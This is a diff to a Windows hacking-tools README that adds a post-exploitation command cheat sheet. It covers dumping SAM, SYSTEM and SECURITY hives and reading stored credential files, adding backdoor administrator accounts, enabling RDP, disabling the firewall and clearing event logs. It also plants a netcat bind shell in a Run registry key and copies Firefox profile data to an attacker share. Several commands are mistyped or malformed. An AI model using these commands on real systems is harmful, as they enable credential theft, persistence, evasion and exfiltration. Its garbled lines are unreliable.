@@ -1,6 +1,7 @@
 ## Windows
 
 Awesome tools to play with Windows !
+- **[Post exploitation commands](#post-exploitation commands)
 
 List of tools used for exploiting Windows:
 
@@ -46,3 +47,230 @@ List of tools used for exploiting Windows:
 - **[Powershell-Payload-Excel-Delivery](https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery)** : Uses Invoke-Shellcode to execute a payload and persist on the system
 - **[mimikittenz](https://github.com/putterpanda/mimikittenz)** : A post-exploitation powershell tool for extracting juicy info from memory.
 
+
+
+
+
+### Post Exploitation Commands
+Query information about the system, network/network connections, running services and services that run upon startup
+
+**systeminfo**:  lists information about system
+ipconfig/all: query ip configuation
+ipconfig /displaydns
+
+**arp /a**: check out viable targets
+
+**Query current drives on system**
+fsutil fsinfo drives
+
+**Grab SAM and SYSTEM files**
+type "C:/windows/repair/SAM"
+type "C:/windows/repair/SYSTEM"
+
+**Tasks**
+tasklist /svc: lists running processes
+taskkill /PID <process ID> /F : forcibly kill task
+taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name tasklist /V /S computername: Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount
+qprocess*: Similar to tasklist but easier to read
+
+**Netstat**
+netstat -ano : to see what services are running on what ports
+netstat -bano
+netstat -r
+netstat -na | findstr :443
+
+**nslookup**: query server information
+
+**nbtstat**: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP
+
+**Query information about server and workstation, Workstation domain name and Logon domain**
+net config server
+net config workstation
+
+**net share**: view shared resources on network
+
+**Change drive to different drive letter**
+ex change to D:/ directory and list it's contents:
+d: & dir
+cd /d d: & dir
+**Cat contents of file located in D:/ directory**
+cd /d & type d:\blah\blah
+
+**net view**
+net view /domain[:DomainName]
+net view \\computerName
+
+arp /a
+
+**Services**
+**View list processes started upon startup**
+net start
+sc query
+wmic startup get caption,command
+
+**Query, Stop/Start/Pause Installed Services**
+sc query state= all
+sc query <service>
+sc <stop> <service>
+
+**Query user and account information**
+
+whoami
+whoami: view logged on user
+whoami /all: lists privileges
+whoami /user
+whoami /groups
+whoami /priv
+
+net user: list users
+For more info on a user:
+net user <username> (for local user)
+net user <username> /domain (for a domain user)
+
+net accounts
+net accounts /domain
+net logalgroup administrators
+net localgroup administrators /dmain
+net group "domain Admins" /domain
+net group "Enterprise Admins" /domain
+
+arp -a: Lists all the systems current in the machine's ARP table
+
+route print: Prints machines routing table
+
+type "C:\documents and settings\administrator\userdata\index.dat"
+
+**Add user**:
+net users <username> <password> /add
+
+**Add user to local administrators group**:
+net localgroup administrators <username> /add
+
+**Delete a user**:
+net users username /delete /domain
+
+**Change user's password**:
+net users <username> <new_password>
+
+View domain admins:
+net group "Domain Admins" /domain
+
+View name of domain controller:
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC
+
+Query group information:
+net view /localgroup
+
+net localgroup Administrators
+net localgroup /Domain
+gpresult: view group policy
+gupdate: update group policy
+gpresult /z
+
+type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files
+
+**Remote System Access**
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+net share \\computername
+tasklist /V /S computername
+qwinsta /SERVER:computername
+qprocess /SERVER:computername *
+net use \\computername (maps IPC$ which does not show up as a drive)
+net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)
+net time \\computername (Shows the time of target computer)
+dir \\computername\share_or_admin_share\ (dir list a remote directory)
+
+
+
+**WMI**
+wmic bios
+wmic qfe
+wmic qfe get hotfixid (This gets patches IDs)
+wmic startup
+wmic service
+wmic os
+wmic process get caption,executablepath,commandline
+wmic process call create “process_name” (executes a program)
+wmic process where name=”process_name” call terminate (terminates program)
+wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)
+wmic useraccount (usernames, sid, and various security related goodies)
+wmic useraccount get /ALL
+wmic share get /ALL (you can use ? for gets help ! )
+wmic startup list full (this can be a huge list!!!) ● wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)
+
+**Reg Command**
+
+reg save HKLM\Security security.hive (Save security hive to a file)
+reg save HKLM\System system.hive (Save system hive to a file)
+reg save HKLM\SAM sam.hive (Save sam to a file)=
+reg add [\\TargetIPaddr\] [RegDomain][ \Key ]
+
+reg export [RegDomain]\[Key] [FileName]
+reg import [FileName ]
+reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )
+
+**Deleting Logs**
+wevtutil el (list logs)
+wevtutil cl
+
+**Uninstalling Software**
+wmic proud get name /value: gets software names
+wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software
+
+qwinsta: Query info about RDP sessions
+at: Query current scheduled tasks
+schtasks: Query scheduled tasks that your current user has access to see.
+set
+schtasks /query /fo csv /v > %TEMP%
+
+**Permissions**
+icacls
+Grant full access over directory and encompassing folders and files:
+icacls "C:\windows" /grant Administrator:F /T
+icacls "C:\" /grant "nt authority\system": F /T
+
+net use: Map network shares
+Mount a remote share with the rights of the current user:
+net use K: \\<ip>\<share>
+dir K:
+
+**Enable remote desktop**
+reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f
+
+net session: list session information
+
+**Firewall**
+
+Query state of firewall:
+netsh firewall show state
+
+Disable firewall
+netsh.exe firewall set opmode mode=disable profile=all
+
+Allow service through firewall
+netsh.exe firewall set portopening tcp 123 MYSERVICE enable all
+
+netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe
+
+HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat
+
+netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE
+
+**Other useful Commands**
+pkgmgr usefull /iu :"Package"
+pkgmgr usefull /iu :"TellnetServer": install telnet service
+pkgmgr /iu:"TelnetClient"
+rundll32.exe user32.dll, LockWorkStation: locks the screen
+wscript.exe <script js/vbs>
+cscript.exe <script js/vbs/c#>
+xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box
+
+type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"
+
+cd "C:/Documents and settings\administrator\userdata" & dir
+
+type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"
+
+type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"
+
+type "C:\documents and settings\administrator\userdata\index.dat"
